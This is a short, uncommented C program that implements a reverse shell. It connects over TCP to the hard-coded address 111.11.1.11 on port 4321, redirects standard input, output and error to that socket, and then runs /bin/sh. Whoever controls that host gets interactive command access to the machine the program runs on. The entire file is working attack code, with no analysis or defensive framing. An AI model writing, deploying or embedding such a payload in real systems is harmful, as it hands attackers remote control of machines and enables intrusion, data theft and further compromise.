#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4321;
    struct sockaddr_in retaddr;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    retaddr.sin_family = AF_INET;       
    retaddr.sin_port = htons(port);
    retaddr.sin_addr.s_addr = inet_addr("111.11.1.11");

    connect(sock, (struct sockaddr *) &retaddr, sizeof(retaddr));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}